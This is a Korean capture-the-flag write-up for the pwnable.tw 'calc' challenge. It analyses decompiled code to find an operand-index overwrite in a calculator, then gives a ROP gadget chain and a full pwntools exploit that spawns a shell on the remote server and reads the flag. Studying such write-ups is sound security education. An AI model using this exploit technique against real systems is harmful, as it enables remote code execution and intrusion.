# analysis
```css
m444ndu@ubuntu:~/pwntw/calc$ checksec calc 
[*] '/home/m444ndu/pwntw/calc/calc'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
  
## main()
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ssignal(14, (int)timeout);
  alarm(60);
  puts((int)"=== Welcome to SECPROG calculator ===");
  fflush(stdout);
  calc();
  return puts((int)"Merry Christmas!");
}
```
  
  
## calc()
```c
unsigned int calc()
{
  int operand_num; // [esp+18h] [ebp-5A0h]
  int operand[100]; // [esp+1Ch] [ebp-59Ch]
  char str[1024]; // [esp+1ACh] [ebp-40Ch]
  unsigned int v4; // [esp+5ACh] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  while ( 1 )
  {
    bzero(str, 0x400u);
    if ( !get_expr(str, 1024) )                 // str에 입력
      break;
    init_pool(&operand_num);                    // operand 초기화
    if ( parse_expr(str, &operand_num) )
    {
      printf((const char *)dword_80BF804, operand[operand_num - 1]);
      fflush(stdout);
    }
  }
  return __readgsdword(0x14u) ^ v4;
}
```

`bzero()` 함수는 `memset()` 함수와 같이 메모리를 초기화하는데 사용합니당. 다만 `memset()` 함수에서 하는 추가검사를 진행하지 않기때문에 안정성은 더 떨어진다고 하네요. `bzero()` 함수는 **C 표준함수**는 아니지만, 메모리를 0으로 만들어주는 기능만을 가지고 있어 효율성 향상을 위해 가끔 사용된다고 합니다.  

`init_pool()` 함수도 역시 결국 `ebp-0x59c` 공간을 0으로 초기화해주는 역할을 합니다.

`get_expr()` 함수는, 입력을 받고 해당 입력에서 연산자와 숫자에 해당하는 값만을 `calc()` 함수의 `str (ebp-0x40c)`에 저장하는 역할을 합니다. 
## get_expr()
```c
int __cdecl get_expr(char *str, int num)
{
  int v2; // eax
  char expr; // [esp+1Bh] [ebp-Dh]
  int count; // [esp+1Ch] [ebp-Ch]

  count = 0;
  while ( count < num && read(0, &expr, 1) != -1 && expr != 10 )
  {
    if ( expr == '+' || expr == '-' || expr == '*' || expr == '/' || expr == '%' || expr > '/' && expr <= '9' )
    {
      v2 = count++;
      str[v2] = expr;
    }
  }
  str[count] = 0;
  return count;
}
```

따라서 `str`에는 연산자와 숫자만이 저장됩니다.

그렇게 저장된 `str`을 가지고 이제 계산을 들어갑니다. ㅐㅎ당과정은 `parse_expr()` 함수에서 이루어집니다.
## parse_expr()
```c
  v11 = __readgsdword(0x14u);
  pstr = str;
  expr_num = 0;
  bzero(exprList, 0x64u);
  for ( i = 0; ; ++i )
  {
```

위의 함수를 간단하게 요약하자면, 우선 연산자를 만났을 때, 좌항의 인자를 `calc()` 함수의 `ebp-0x59c` 부터 차곡차곡 저장합니다. `calc()` 함수의 `ebp-0x5a0`에는 인자의 개수가 저장됩니다. 이 부분은 `if(integer > 0 ){} 문`에서 동작하는데, 해당 부분에서 취약점이 발생합니다.

정확히 말하자면, `eval()` 함수에서 예외처리가 되지않아, 위의 부분에서 특정 인덱스에 덮어쓰기가 가능합니다.
## eval()
```c
int *__cdecl eval(int *v1, char expr)
{
  int *result; // eax

  if ( expr == '+' )
  {
    v1[*v1 - 1] += v1[*v1];
  }
  else if ( expr > '+' )
  {
    if ( expr == '-' )
    {
      v1[*v1 - 1] -= v1[*v1];
    }
    else if ( expr == '/' )
    {
      v1[*v1 - 1] /= v1[*v1];
    }
  }
  else if ( expr == '*' )
  {
    v1[*v1 - 1] *= v1[*v1];
  }
  result = v1;
  --*v1;
  return result;
}
```

`eval()` 함수를 보면, `v1[*v1 - 1] += v1[*v1]` 을 이용하여 인자들끼리 연산을 진행합니다.
`*v1` 값이 인자의 개수이기 때문에, 정상적으로 연산 시 해당 값은 `2`이상을 갖게 됩니다.
하지만, 만약 `*v1`의 값이 `1`이라면 `*v1`의 값(=인자의 개수라쓰고 인덱스라 읽는다..)을 연산과정에서 덮어쓸 수 있습니다.

`parse_expr()` 함수에서 아래의 부분이 `*v1`의 값을 인덱스로 사용하여 값을 쓰기 때문에, 해당 취약점을 이용하여 사실상 스택 주소 영역 내에서는 원하는 곳에 값을 쓸 수 있게 됩니다.

```c
operand_num = (*v1)++
v1[operand_num + 1] = integer
```

본 문제에서는 연산자를 중복으로 오게 하는 것 등의 다양한 예외처리가 존재하지만, 첫 문자로 숫자가 아닌 연산자로 오는 것에 대한 프로텍터는 마련되어있지 않습니다. 따라서 `+333+5` 의 경우, `v1[334]` 위치에 `5` 값을 저장하게 할 수 있습니다.

해당 문제는 **static linking**이 되어있어서 **libc leak**도 할 수 없고(`calc()`의 `printf` 구문을 이용하면 메모리 **leak**은 가능합니다.), 그렇다고 `function` 중 바로 쉘을 딴다거나 플래그를 읽어주는 친절한 함수들도 존재하지 않습니다. 물론 쉘코드를 올린 뒤 실행할 수 있는 메모리 영역도 존재하지 않습니다. 

할 수 있는 건 스택 쓰기와 `eip` 컨트롤뿐인데 실행권한은 `text 영역`에만 있으니 그냥 `gadget`들을 주섬주섬 모아서 `rop chain`을 만들었습니다...

아직 `gadget` 사용하는게 서툴러서 굉장히 많이 더럽기는 한데 다행히 잘 돌아가긴 합니다...ㅎ

사용한 `gadget`들
```python
# ecx 0, ebx bss
0x08049f13 : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
bss : 0x80eb100
1
1
1

0x080701aa : pop edx ; ret
0x6e69622f "/bin"

# "/bin" 저장
0x080548e3 : mov dword ptr [ebx], edx ; add esp, 0x18 ; pop ebx ; ret
1
1
1
1
1
1
bss+4 : 0x80eb104

0x080701aa : pop edx ; ret
0x68732f2f "//sh"

# "//sh" 저장
0x080548e3 : mov dword ptr [ebx], edx ; add esp, 0x18 ; pop ebx ; ret
1
1
1
1
1
1
bss : 0x80eb100

# ecx 0, edx 0, ebx "/bin//sh"
0x0808c2ed : xor edx, edx ; pop ebx ; div esi ; pop esi ; pop edi ; pop ebp ; ret
bss : 0x80eb100
1
1
1

0x0805c34b : pop eax ; ret
0xb
0x08049a21 : int 0x80

=> mov [ebx], edx를 이용하여 ebx에는 bss 영역 넣고, edx에는 "/bin//sh" 문자열을 집어넣어서 차곡차곡 ebx가 문자열을 나타낼 수 있도록 만들었습니다. eip를 덮을 때, 전 인덱스에 영향을 주기 때문에, 뒤에서부터 거꾸로 chain을 덮었습니다.
```

# exploit
```python
#! /usr/bin/python
from pwn import *

#r = process('./calc')
r = remote('chall.pwnable.tw',10100)
#context.log_level='debug'
#gdb.attach(r,'b* 0x8049411')
#gdb.attach(r,'b* 0x08049433')

payload = []
payload.append('134520595') # 0x08049f13 : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
payload.append('135180544') # bss : 0x80eb100
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1

payload.append('134676906') # 0x080701aa : pop edx ; ret
payload.append('1852400175') # 0x6e69622f "/bin"

payload.append('134564067') # 0x080548e3 : mov dword ptr [ebx], edx ; add esp, 0x18 ; pop ebx ; ret
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('135180548') # bss+4 : 0x80eb104

payload.append('134676906') # 0x080701aa : pop edx ; ret
payload.append('1752379183') # 0x68732f2f "//sh"

payload.append('134564067') # 0x080548e3 : mov dword ptr [ebx], edx ; add esp, 0x18 ; pop ebx ; ret
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('135180544') # bss : 0x80eb100

payload.append('134791917') # 0x0808c2ed : xor edx, edx ; pop ebx ; div esi ; pop esi ; pop edi ; pop ebp ; ret
payload.append('135180544') # bss : 0x80eb100
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1

payload.append('134595403') # 0x0805c34b : pop eax ; ret
payload.append('11') # 0xb
payload.append('134519329') # 0x08049a21 : int 0x80



r.recvuntil("=== Welcome to SECPROG calculator ===")
for i in range(len(payload)):
    r.sendline("+"+str(360+len(payload)-i-1)+"+"+payload[len(payload)-i-1])
    r.recvline()

r.send('\n')
r.sendline('cat /home/calc/flag')
r.interactive()
```
